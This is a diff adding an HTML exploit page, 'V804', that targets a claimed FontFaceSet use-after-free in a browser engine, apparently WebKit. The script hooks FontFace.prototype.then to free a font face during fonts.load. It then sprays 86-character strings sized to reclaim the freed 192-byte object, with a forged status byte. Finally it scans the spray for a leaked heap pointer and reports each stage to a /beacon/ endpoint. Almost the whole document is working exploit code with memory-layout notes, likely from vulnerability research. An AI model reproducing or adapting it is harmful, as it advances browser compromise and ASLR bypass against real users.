@@ -1,0 +1,272 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>V804</title>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="refresh" content="180"></head>
+<body><pre id="out">V804 -- FontFaceSet UAF: 86-char spray + m_status=Success + ptr leak</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var bp=[];for(var i=0;i<1200;i++)bp.push(new Image());
+var bi=0,sq=0;
+function B(tag,data){
+  var s=String(sq).padStart(3,'0');sq++;
+  var url='/beacon/V804-'+s+'-'+tag;
+  if(data!==undefined)url+='?d='+encodeURIComponent(String(data).substring(0,900));
+  if(bi<bp.length){bp[bi].src=url;bi++;}
+  say('['+s+'] '+tag+(data!==undefined?': '+String(data).substring(0,200):''));
+}
+
+B('BOOT','v804-86char-status3-ptrleak');
+
+// ============================================
+// S0: API CHECKS
+// ============================================
+var hasFF=typeof FontFace!=='undefined';
+var hasFS=typeof document.fonts!=='undefined';
+var hasFSload=hasFS&&typeof document.fonts.load==='function';
+var hasFScheck=hasFS&&typeof document.fonts.check==='function';
+B('ENTER-S0','FF='+hasFF+'|FS='+hasFS+'|load='+hasFSload+'|check='+hasFScheck);
+if(!hasFF||!hasFSload){B('FAIL-S0','missing-api');throw 0;}
+B('PASS-S0','api-ok');
+
+// ============================================
+// S1: FONT SETUP
+// ============================================
+var faceA=new FontFace('a','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(faceA);
+B('PASS-S1-A','face-a-added|status='+faceA.status);
+
+var styleEl=document.createElement('style');
+styleEl.textContent='@font-face{font-family:x;src:local(Arial);unicode-range:U+0042;}';
+document.head.appendChild(styleEl);
+B('PASS-S1-X','stylesheet-x-added');
+
+var promiseA=faceA.loaded;
+B('PASS-S1-MAT-A','loaded-promise-materialized|type='+typeof promiseA);
+
+// ============================================
+// S2: BUILD 86-CHAR SPRAY + INSTALL THEN GETTER
+//
+// CSSFontFace = 192 bytes (source-audited layout).
+// StringImpl = 20 header + 86*2 = 192 bytes -> SAME bmalloc size class.
+//
+// Key offsets (CSSFontFace -> string char):
+//   offset 72-87:  m_sources (Vector)        -> chars 26-33 [size=0 with zeros]
+//   offset 88-103: m_clients (WeakHashSet)   -> chars 34-41 [null table]
+//   offset 104-111: m_wrapper (WeakPtr)      -> chars 42-45 [LEAK TARGET]
+//   offset 130: m_status (uint8_t)           -> char 55 low byte [=3 Success]
+//   offset 144+: m_timeoutTimer              -> chars 62+ [NEVER REACHED]
+//
+// With m_status=Success(3), pump() returns 0 with no setStatus/Timer access.
+// wrapper() creates FontFace, writes WeakPtr to chars 42-45 = heap leak.
+// ============================================
+var SPRAY_LEN=86;
+var sprayChars=new Array(SPRAY_LEN);
+for(var c=0;c<SPRAY_LEN;c++) sprayChars[c]=0x0000;
+sprayChars[55]=0x0003;
+B('PASS-S2-TPL','len='+SPRAY_LEN+'|c55=0x'+sprayChars[55].toString(16));
+
+var thenFired=false;
+var thenTime=0;
+var sprayStrings=[];
+var innerCheckX='?',innerCheckA='?';
+
+Object.defineProperty(FontFace.prototype,'then',{
+  get:function(){
+    if(thenFired) return undefined;
+    thenFired=true;
+    thenTime=Date.now();
+    B('ENTER-S3-THEN','getter-fired');
+
+    try{
+      styleEl.parentNode.removeChild(styleEl);
+      B('PASS-S3-RM','stylesheet-removed');
+    }catch(e){B('FAIL-S3-RM',e.message);}
+
+    try{
+      document.body.offsetHeight;
+      B('PASS-S3-REBUILD','layout-forced');
+    }catch(e){B('FAIL-S3-REBUILD',e.message);}
+
+    for(var s=0;s<3000;s++){
+      sprayChars[85]=s&0xFFFF;
+      sprayStrings.push(String.fromCharCode.apply(null,sprayChars));
+    }
+    sprayChars[85]=0;
+    B('PASS-S3-SPRAY','n='+sprayStrings.length+'|sz='+SPRAY_LEN+'|alloc=192');
+
+    try{
+      innerCheckX=document.fonts.check('1em x');
+      innerCheckA=document.fonts.check('1em a');
+      B('PASS-S3-ICHK','x='+innerCheckX+'|a='+innerCheckA);
+    }catch(e){B('FAIL-S3-ICHK',e.message);}
+
+    return undefined;
+  },
+  configurable:true
+});
+B('PASS-S2-THEN','getter-installed');
+
+// ============================================
+// S3: TRIGGER
+// ============================================
+B('ENTER-S3-LOAD','calling-fonts.load');
+document.fonts.load('1em a, x','AB').then(function(faces){
+  var fc=faces?faces.length:'null';
+  B('PASS-S3-RESOLVE','faces='+fc);
+
+  // IMMEDIATE spray scan -- before any face property access
+  var winIdx=-1,hitCount=0;
+  var cW=[0,0,0,0];
+  for(var s=0;s<sprayStrings.length;s++){
+    var c42=sprayStrings[s].charCodeAt(42);
+    var c43=sprayStrings[s].charCodeAt(43);
+    var c44=sprayStrings[s].charCodeAt(44);
+    var c45=sprayStrings[s].charCodeAt(45);
+    if(c42!==0||c43!==0||c44!==0||c45!==0){
+      hitCount++;
+      if(winIdx<0){winIdx=s;cW=[c42,c43,c44,c45];}
+    }
+  }
+  if(winIdx>=0){
+    try{
+      var ab=new ArrayBuffer(8);
+      var u16=new Uint16Array(ab);
+      u16[0]=cW[0];u16[1]=cW[1];u16[2]=cW[2];u16[3]=cW[3];
+      var u64=new BigUint64Array(ab);
+      var ptrHex='0x'+u64[0].toString(16).padStart(16,'0');
+      B('PASS-S3-LEAK','HEAP-PTR|idx='+winIdx+'|ptr='+ptrHex+'|hits='+hitCount);
+    }catch(e){
+      var h='0x'+('0000'+cW[3].toString(16)).slice(-4)+('0000'+cW[2].toString(16)).slice(-4)+('0000'+cW[1].toString(16)).slice(-4)+('0000'+cW[0].toString(16)).slice(-4);
+      B('PASS-S3-LEAK','HEAP-PTR-NOBI|idx='+winIdx+'|ptr='+h+'|hits='+hitCount);
+    }
+    // Full diff on winning string
+    var ws=sprayStrings[winIdx],mods=[];
+    for(var ch=0;ch<SPRAY_LEN;ch++){
+      var exp=(ch===55)?0x0003:((ch===85)?(winIdx&0xFFFF):0x0000);
+      if(ws.charCodeAt(ch)!==exp) mods.push('c'+ch+'=0x'+ws.charCodeAt(ch).toString(16));
+    }
+    B('PASS-S3-DIFF','n='+mods.length+(mods.length?'|'+mods.slice(0,25).join('|'):''));
+  } else {
+    B('FAIL-S3-LEAK','NO-WRITES|sprayed='+sprayStrings.length);
+  }
+
+  // Safe face 0 only
+  if(faces&&faces.length>=1){
+    try{B('PASS-S3-F0','fam='+(faces[0].family||'?')+'|st='+(faces[0].status||'?'));}
+    catch(e){B('FAIL-S3-F0',e.message);}
+  }
+  if(faces&&faces.length>=2){
+    B('PASS-S3-F1','SKIPPED-confused|count='+faces.length);
+  }
+}).catch(function(e){
+  B('FAIL-S3-REJECT',String(e&&e.message||e));
+});
+
+// ============================================
+// S4: POST-LOAD DETECTION (500ms)
+// ============================================
+setTimeout(function(){
+  B('ENTER-S4','post-load');
+  B('PASS-S4-THEN','fired='+thenFired+'|t='+(thenFired?thenTime:0));
+
+  var postCheckA='?',postCheckX='?';
+  try{
+    postCheckA=document.fonts.check('1em a');
+    postCheckX=document.fonts.check('1em x');
+    B('PASS-S4-CHK','a='+postCheckA+'|x='+postCheckX);
+  }catch(e){B('FAIL-S4-CHK',e.message);}
+
+  B('PASS-S4-INNER','ix='+innerCheckX+'|ia='+innerCheckA);
+
+  if(postCheckX===true&&thenFired){
+    B('PASS-S4-SIG','TYPE-CONFUSION-DETECTED');
+  } else if(thenFired&&postCheckX===false){
+    B('PASS-S4-SIG','UAF-TRIGGERED-NO-RECLAIM');
+  } else if(!thenFired){
+    B('FAIL-S4-SIG','THEN-NOT-FIRED');
+  } else {
+    B('PASS-S4-SIG','UAF-TRIGGERED-CHECK='+postCheckX);
+  }
+
+  // ============================================
+  // S5: POINTER LEAK SCAN (1s delay)
+  // m_wrapper at offset 104-111 = chars 42-45
+  // ============================================
+  setTimeout(function(){
+    B('ENTER-S5','ptr-leak-scan');
+
+    var winIdx=-1;
+    var hitCount=0;
+    var c42w=0,c43w=0,c44w=0,c45w=0;
+
+    for(var s=0;s<sprayStrings.length;s++){
+      var c42=sprayStrings[s].charCodeAt(42);
+      var c43=sprayStrings[s].charCodeAt(43);
+      var c44=sprayStrings[s].charCodeAt(44);
+      var c45=sprayStrings[s].charCodeAt(45);
+      if(c42!==0||c43!==0||c44!==0||c45!==0){
+        hitCount++;
+        if(winIdx<0){
+          winIdx=s;
+          c42w=c42;c43w=c43;c44w=c44;c45w=c45;
+        }
+      }
+    }
+
+    if(winIdx>=0){
+      try{
+        var ab=new ArrayBuffer(8);
+        var u16=new Uint16Array(ab);
+        u16[0]=c42w; u16[1]=c43w; u16[2]=c44w; u16[3]=c45w;
+        var u64=new BigUint64Array(ab);
+        var ptrHex='0x'+u64[0].toString(16).padStart(16,'0');
+        B('PASS-S5-PTR','HEAP-LEAK|idx='+winIdx+'|ptr='+ptrHex+'|hits='+hitCount);
+      }catch(e){
+        var manualHex='0x'+('0000'+c45w.toString(16)).slice(-4)+('0000'+c44w.toString(16)).slice(-4)+('0000'+c43w.toString(16)).slice(-4)+('0000'+c42w.toString(16)).slice(-4);
+        B('PASS-S5-PTR','HEAP-LEAK-NOBI|idx='+winIdx+'|ptr='+manualHex+'|hits='+hitCount);
+      }
+
+      var ws=sprayStrings[winIdx];
+      var mods=[];
+      for(var ch=0;ch<SPRAY_LEN;ch++){
+        var expect;
+        if(ch===55) expect=0x0003;
+        else if(ch===85) expect=winIdx&0xFFFF;
+        else expect=0x0000;
+        var got=ws.charCodeAt(ch);
+        if(got!==expect) mods.push('c'+ch+'=0x'+got.toString(16));
+      }
+      B('PASS-S5-MODS','n='+mods.length+(mods.length?'|'+mods.slice(0,20).join('|'):''));
+    } else {
+      B('FAIL-S5-PTR','NO-WINNER|hits=0');
+      var anyMod=0,anyList=[];
+      for(var s=0;s<Math.min(sprayStrings.length,200);s++){
+        for(var ch=0;ch<SPRAY_LEN;ch++){
+          var expect2;
+          if(ch===55) expect2=0x0003;
+          else if(ch===85) expect2=s&0xFFFF;
+          else expect2=0x0000;
+          var got2=sprayStrings[s].charCodeAt(ch);
+          if(got2!==expect2){
+            anyMod++;
+            if(anyList.length<15) anyList.push('s'+s+'c'+ch+'=0x'+got2.toString(16));
+          }
+        }
+      }
+      B('PASS-S5-DIAG','mods='+anyMod+(anyList.length?'|'+anyList.join('|'):''));
+    }
+
+    B('PASS-S5','complete');
+  },1000);
+
+},500);
+
+var hbN=0;
+setInterval(function(){
+  hbN++;
+  B('HB','n='+hbN+'|then='+thenFired+'|spray='+sprayStrings.length);
+},30000);
+
+B('PASS-INIT','v804-ready');
+</script></body></html>
